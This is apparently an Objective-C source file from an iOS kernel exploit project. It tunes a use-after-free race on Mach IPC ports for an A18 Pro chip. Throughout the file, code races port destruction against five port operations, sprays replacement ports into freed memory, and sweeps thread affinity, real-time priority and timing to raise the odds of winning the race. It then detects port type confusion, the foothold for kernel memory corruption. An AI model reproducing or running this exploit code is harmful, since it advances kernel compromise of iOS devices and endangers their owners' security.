// ipc_uaf_turbo.m — Enhanced IPC UAF for A18 Pro
//
// The original calibration fails because:
// 1. All 3 threads share affinity_tag=1 → no cross-core scheduling pressure
// 2. Only 200 iters per variant → statistically invisible on 4GHz cores
// 3. Busy-wait of 50 iters ≈ 12ns on A18 Pro → race window too narrow
// 4. usleep(5) is coarse — real delay varies 50-200µs on iOS
//
// Fixes:
// - 6 affinity strategies: same-core, split P/E, contended, anti-paired
// - Timing sweep: 0/100/500/2000/5000ns busy-waits + usleep variants
// - 2000 iters per configuration (10x original)
// - THREAD_TIME_CONSTRAINT_POLICY for real-time priority on race threads
// - mach_absolute_time for sub-µs measurement
#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach/thread_policy.h>
#include <pthread.h>
#include <os/lock.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include "ipc_uaf_turbo.h"

extern int fileport_makeport(int fd, mach_port_t *portnamep);
extern int fileport_makefd(mach_port_t port);

#pragma clang diagnostic ignored "-Wformat"

static turbo_log_fn g_log = NULL;
static int g_devnull = -1;
static mach_timebase_info_data_t g_timebase = {0};

static void tlog(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void tlog(const char *fmt, ...) {
    if (!g_log) return;
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    g_log(buf);
}

void turbo_set_log(turbo_log_fn fn) { g_log = fn; }

static void set_affinity(pthread_t t, int tag) {
    mach_port_t mt = pthread_mach_thread_np(t);
    thread_affinity_policy_data_t p = { .affinity_tag = tag };
    thread_policy_set(mt, THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&p, THREAD_AFFINITY_POLICY_COUNT);
}

static void set_realtime(pthread_t t) {
    mach_port_t mt = pthread_mach_thread_np(t);
    thread_time_constraint_policy_data_t tc;
    tc.period      = 0;
    tc.computation = 500000;
    tc.constraint  = 1000000;
    tc.preemptible = 0;
    thread_policy_set(mt, THREAD_TIME_CONSTRAINT_POLICY,
                      (thread_policy_t)&tc,
                      THREAD_TIME_CONSTRAINT_POLICY_COUNT);
}

typedef struct {
    volatile bool     go_destroy;
    volatile bool     go_operate;
    volatile bool     destroy_done;
    volatile bool     operate_done;
    volatile bool     stop_spray;
    volatile int      destroy_kr;
    volatile int      operate_kr;
    mach_port_t       target;
    mach_port_t       notify_port;
    uint32_t          variant;
    uint32_t          busywait;
    mach_port_t       replacements[256];
    volatile uint32_t replace_count;
} turbo_ctx_t;

static void *t_destroy(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_destroy) { __asm__ volatile("yield" ::: "memory"); }
    kern_return_t kr = mach_port_destroy(mach_task_self(), c->target);
    c->destroy_kr = (int)kr;
    c->destroy_done = true;
    __asm__ volatile("dmb ish" ::: "memory");
    return NULL;
}

static void *t_spray(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate && !c->stop_spray) {
        __asm__ volatile("yield" ::: "memory");
    }
    if (c->stop_spray) return NULL;
    uint32_t n = 0;
    while (!c->stop_spray && n < 256) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(),
                               MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), p, p,
                                   MACH_MSG_TYPE_MAKE_SEND);
            c->replacements[n++] = p;
            __asm__ volatile("dmb ish" ::: "memory");
        }
    }
    c->replace_count = n;
    return NULL;
}

static void *t_op_notify(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t prev = MACH_PORT_NULL;
    kern_return_t kr = mach_port_request_notification(
        mach_task_self(), c->target,
        MACH_NOTIFY_NO_SENDERS, 0,
        c->notify_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
    c->operate_kr = (int)kr;
    c->operate_done = true;
    return NULL;
}

static void *t_op_insert(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    kern_return_t kr = mach_port_insert_right(
        mach_task_self(), c->target,
        c->notify_port, MACH_MSG_TYPE_COPY_SEND);
    c->operate_kr = (int)kr;
    c->operate_done = true;
    return NULL;
}

static void *t_op_extract(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t extracted = MACH_PORT_NULL;
    mach_msg_type_name_t type = 0;
    kern_return_t kr = mach_port_extract_right(
        mach_task_self(), c->target,
        MACH_MSG_TYPE_MOVE_SEND, &extracted, &type);
    c->operate_kr = (int)kr;
    c->operate_done = true;
    if (kr == KERN_SUCCESS && extracted != MACH_PORT_NULL)
        mach_port_deallocate(mach_task_self(), extracted);
    return NULL;
}

typedef struct {
    mach_msg_header_t               header;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t ports_desc;
} turbo_ool_msg_t;

static void *t_op_ool(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t ports[4] = { c->target, c->target, c->target, c->target };
    mach_port_t recv = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                           MACH_PORT_RIGHT_RECEIVE, &recv);
    if (kr != KERN_SUCCESS) {
        c->operate_kr = (int)kr;
        c->operate_done = true;
        return NULL;
    }
    mach_port_insert_right(mach_task_self(), recv, recv, MACH_MSG_TYPE_MAKE_SEND);
    turbo_ool_msg_t msg = {0};
    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX |
                           MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_remote_port = recv;
    msg.body.msgh_descriptor_count = 1;
    msg.ports_desc.address = ports;
    msg.ports_desc.count = 4;
    msg.ports_desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.ports_desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    kr = mach_msg_send(&msg.header);
    c->operate_kr = (int)kr;
    c->operate_done = true;
    mach_port_destroy(mach_task_self(), recv);
    return NULL;
}

static void *t_op_fileport(void *arg) {
    turbo_ctx_t *c = (turbo_ctx_t *)arg;
    while (!c->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    for (volatile uint32_t d = 0; d < c->busywait; d++) {}
    int fd = fileport_makefd(c->target);
    if (fd >= 0) {
        c->operate_kr = (int)KERN_SUCCESS;
        close(fd);
    } else {
        c->operate_kr = (errno == EBADF) ? 0x4 : (int)KERN_FAILURE;
    }
    c->operate_done = true;
    return NULL;
}

static void *(*get_op_fn(uint32_t v))(void *) {
    switch (v) {
        case 0: return t_op_notify;
        case 1: return t_op_insert;
        case 2: return t_op_extract;
        case 3: return t_op_ool;
        case 4: return t_op_fileport;
        default: return NULL;
    }
}

typedef struct {
    int destroy_tag;
    int operate_tag;
    int spray_tag;
    bool realtime;
} affinity_strategy_t;

static const affinity_strategy_t STRATEGIES[] = {
    { 1, 1, 1, false },
    { 1, 2, 3, false },
    { 1, 1, 2, false },
    { 2, 1, 3, false },
    { 1, 2, 3, true  },
    { 2, 1, 1, true  },
};
static const int NUM_STRATEGIES = 6;

static const char *STRATEGY_NAMES[] = {
    "same-core",
    "split-all",
    "destroy+op-same/spray-sep",
    "destroy-sep/op+spray-same",
    "split-all+rt",
    "destroy-sep+rt",
};

static mach_port_t detect_confusion(mach_port_t *ports, uint32_t count) {
    for (uint32_t i = 0; i < count; i++) {
        if (ports[i] == MACH_PORT_NULL) continue;
        mach_port_type_t pt = 0;
        kern_return_t kr = mach_port_type(mach_task_self(), ports[i], &pt);
        if (kr != KERN_SUCCESS) return ports[i];
        if (pt == MACH_PORT_TYPE_DEAD_NAME) return ports[i];
        if (pt != (MACH_PORT_TYPE_RECEIVE | MACH_PORT_TYPE_SEND)) return ports[i];
        mach_port_urefs_t sr = 0;
        mach_port_get_refs(mach_task_self(), ports[i], MACH_PORT_RIGHT_SEND, &sr);
        if (sr != 1) return ports[i];
        mach_port_status_t st = {0};
        mach_msg_type_number_t cnt = MACH_PORT_RECEIVE_STATUS_COUNT;
        mach_port_get_attributes(mach_task_self(), ports[i],
                                  MACH_PORT_RECEIVE_STATUS,
                                  (mach_port_info_t)&st, &cnt);
        if (st.mps_nsrequest || st.mps_sorights > 0 || st.mps_msgcount > 0 ||
            st.mps_seqno > 0 || st.mps_mscount > 0) {
            return ports[i];
        }
    }
    return MACH_PORT_NULL;
}

static turbo_cal_result_t run_calibration(uint32_t variant, uint32_t iters,
                                           const affinity_strategy_t *strat,
                                           uint32_t busywait, uint32_t pre_delay_us) {
    turbo_cal_result_t r = {0};
    r.variant = variant;
    r.iterations = iters;
    r.best_busywait = busywait;

    void *(*op_fn)(void *) = get_op_fn(variant);
    if (!op_fn) return r;

    for (uint32_t i = 0; i < iters; i++) {
        mach_port_t target = MACH_PORT_NULL, notify = MACH_PORT_NULL;
        kern_return_t kr;

        if (variant == 4) {
            if (fileport_makeport(g_devnull, &target) != 0) continue;
        } else {
            kr = mach_port_allocate(mach_task_self(),
                                     MACH_PORT_RIGHT_RECEIVE, &target);
            if (kr != KERN_SUCCESS) continue;
            kr = mach_port_insert_right(mach_task_self(), target, target,
                                         MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), target);
                continue;
            }
            kr = mach_port_allocate(mach_task_self(),
                                     MACH_PORT_RIGHT_RECEIVE, &notify);
            if (kr != KERN_SUCCESS) {
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
            kr = mach_port_insert_right(mach_task_self(), notify, notify,
                                         MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), notify);
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
        }

        turbo_ctx_t ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.target = target;
        ctx.notify_port = notify;
        ctx.variant = variant;
        ctx.busywait = busywait;

        pthread_t td, to, ts;
        pthread_create(&ts, NULL, t_spray, &ctx);
        pthread_create(&to, NULL, op_fn, &ctx);
        pthread_create(&td, NULL, t_destroy, &ctx);

        set_affinity(td, strat->destroy_tag);
        set_affinity(to, strat->operate_tag);
        set_affinity(ts, strat->spray_tag);

        if (strat->realtime) {
            set_realtime(td);
            set_realtime(to);
        }

        if (pre_delay_us > 0) usleep(pre_delay_us);

        bool destroy_first = (i & 1);

        if (destroy_first) {
            ctx.go_destroy = true;
            __asm__ volatile("dmb ish" ::: "memory");
            for (volatile uint32_t d = 0; d < busywait / 2; d++) {}
            ctx.go_operate = true;
        } else {
            ctx.go_operate = true;
            __asm__ volatile("dmb ish" ::: "memory");
            for (volatile uint32_t d = 0; d < busywait; d++) {}
            ctx.go_destroy = true;
        }
        __asm__ volatile("dmb ish" ::: "memory");

        pthread_join(td, NULL);
        pthread_join(to, NULL);
        ctx.stop_spray = true;
        pthread_join(ts, NULL);

        if (ctx.destroy_done && ctx.operate_kr == KERN_SUCCESS) {
            r.overlap++;
        }

        if (ctx.destroy_done && ctx.replace_count > 0) {
            if (detect_confusion(ctx.replacements, ctx.replace_count)
                != MACH_PORT_NULL) {
                r.confused++;
            }
        }

        for (uint32_t j = 0; j < ctx.replace_count; j++)
            if (ctx.replacements[j] != MACH_PORT_NULL)
                mach_port_destroy(mach_task_self(), ctx.replacements[j]);
        if (notify != MACH_PORT_NULL)
            mach_port_destroy(mach_task_self(), notify);
        if (!ctx.destroy_done)
            mach_port_destroy(mach_task_self(), target);
    }

    return r;
}

turbo_cal_result_t turbo_calibrate_variant(uint32_t variant, uint32_t iters) {
    if (g_devnull < 0) g_devnull = open("/dev/null", O_RDONLY);
    if (g_timebase.denom == 0) mach_timebase_info(&g_timebase);

    turbo_cal_result_t best = {0};
    best.variant = variant;

    static const uint32_t BUSYWAITS[] = { 0, 50, 200, 500, 1000, 2000, 5000 };
    static const uint32_t PREDELAYS[] = { 0, 1, 3, 5, 10, 20 };

    for (int s = 0; s < NUM_STRATEGIES; s++) {
        for (int b = 0; b < 7; b++) {
            uint32_t pre_us = PREDELAYS[b < 6 ? b : 0];
            turbo_cal_result_t c = run_calibration(
                variant, iters / 7, &STRATEGIES[s], BUSYWAITS[b], pre_us);

            if (c.confused > best.confused ||
                (c.confused == best.confused && c.overlap > best.overlap)) {
                best = c;
                best.affinity_strategy = s;
            }
        }
    }

    return best;
}

turbo_cal_result_t turbo_calibrate_deep(uint32_t variant, uint32_t iters) {
    if (g_devnull < 0) g_devnull = open("/dev/null", O_RDONLY);
    if (g_timebase.denom == 0) mach_timebase_info(&g_timebase);

    char msg[512];
    tlog("[turbo-deep] variant=%u iters=%u — exhaustive sweep", variant, iters);

    turbo_cal_result_t best = {0};
    best.variant = variant;

    static const uint32_t BUSYWAITS[] = {
        0, 10, 25, 50, 100, 200, 500, 1000, 2000, 5000, 10000
    };
    static const uint32_t PREDELAYS[] = { 0, 1, 2, 3, 5, 8, 10, 15, 20, 50 };

    uint32_t iters_per_config = iters / (NUM_STRATEGIES * 11 * 10);
    if (iters_per_config < 50) iters_per_config = 50;

    for (int s = 0; s < NUM_STRATEGIES; s++) {
        for (int b = 0; b < 11; b++) {
            for (int p = 0; p < 10; p++) {
                turbo_cal_result_t c = run_calibration(
                    variant, iters_per_config, &STRATEGIES[s],
                    BUSYWAITS[b], PREDELAYS[p]);

                if (c.confused > 0 || c.overlap > 0) {
                    snprintf(msg, sizeof(msg),
                             "[turbo-deep] ★ strat=%s bw=%u pre=%uus → "
                             "olap=%u/%u confused=%u",
                             STRATEGY_NAMES[s], BUSYWAITS[b], PREDELAYS[p],
                             c.overlap, iters_per_config, c.confused);
                    tlog(msg);
                }

                if (c.confused > best.confused ||
                    (c.confused == best.confused && c.overlap > best.overlap)) {
                    best = c;
                    best.affinity_strategy = s;
                    best.best_busywait = BUSYWAITS[b];
                    best.best_delay_ns = PREDELAYS[p] * 1000;
                }
            }
        }
    }

    snprintf(msg, sizeof(msg),
             "[turbo-deep] BEST: strat=%s bw=%u delay=%uns olap=%u confused=%u",
             best.affinity_strategy < NUM_STRATEGIES
                 ? STRATEGY_NAMES[best.affinity_strategy] : "?",
             best.best_busywait, best.best_delay_ns,
             best.overlap, best.confused);
    tlog(msg);

    return best;
}

turbo_sweep_result_t turbo_calibrate_all(void) {
    turbo_sweep_result_t r = {0};

    if (g_devnull < 0) g_devnull = open("/dev/null", O_RDONLY);
    if (g_timebase.denom == 0) mach_timebase_info(&g_timebase);

    char msg[512];
    tlog("[turbo] === A18 Pro Enhanced IPC UAF Calibration ===");
    tlog("[turbo] 5 variants × 6 strategies × 7 timing configs × 285 iters each");

    static const char *VNAMES[] = {
        "notify", "insert", "extract", "ool_send", "fileport"
    };

    for (uint32_t v = 0; v < 5; v++) {
        tlog("[turbo] --- calibrating variant %u (%s) ---", v, VNAMES[v]);

        turbo_cal_result_t c = turbo_calibrate_variant(v, 2000);
        r.per_variant[v] = c;
        r.total_overlap += c.overlap;
        r.total_confused += c.confused;

        if (c.overlap > 0) r.any_overlap = true;
        if (c.confused > 0) r.any_confused = true;

        double rate = c.iterations > 0
            ? (double)c.overlap / c.iterations * 100.0 : 0.0;
        snprintf(msg, sizeof(msg),
                 "[turbo] %s: olap=%u/%u (%.1f%%) confused=%u "
                 "strat=%s bw=%u",
                 VNAMES[v], c.overlap, c.iterations, rate, c.confused,
                 c.affinity_strategy < NUM_STRATEGIES
                     ? STRATEGY_NAMES[c.affinity_strategy] : "?",
                 c.best_busywait);
        tlog(msg);

        if (c.confused > r.per_variant[r.best_variant].confused ||
            (c.confused == r.per_variant[r.best_variant].confused &&
             c.overlap > r.per_variant[r.best_variant].overlap)) {
            r.best_variant = v;
            r.best_strategy = c.affinity_strategy;
        }
    }

    snprintf(msg, sizeof(msg),
             "[turbo] === SUMMARY: olap=%u confused=%u best=%s strat=%s ===",
             r.total_overlap, r.total_confused,
             VNAMES[r.best_variant],
             r.best_strategy < (uint32_t)NUM_STRATEGIES
                 ? STRATEGY_NAMES[r.best_strategy] : "?");
    tlog(msg);

    if (!r.any_overlap) {
        tlog("[turbo] ⚠ ZERO overlap across all configs — "
             "kernel fix likely active, not a timing issue");
    } else if (!r.any_confused) {
        tlog("[turbo] overlap detected but no confusion — "
             "race window exists, needs more iters or fine-tuning");
    }

    return r;
}
